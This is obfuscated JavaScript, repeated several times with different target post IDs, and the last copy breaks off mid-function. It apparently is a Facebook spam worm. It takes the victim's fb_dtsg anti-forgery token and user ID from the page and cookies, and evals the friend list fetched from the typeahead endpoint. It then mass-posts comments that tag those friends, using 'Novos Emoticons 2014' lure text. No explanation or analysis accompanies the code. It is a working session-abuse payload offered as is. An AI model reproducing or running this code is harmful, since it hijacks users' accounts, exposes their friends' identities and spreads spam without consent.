user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","625745820834132","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","486849431414513","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","277013782477756","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","235225856677513","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","224761497713861","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var 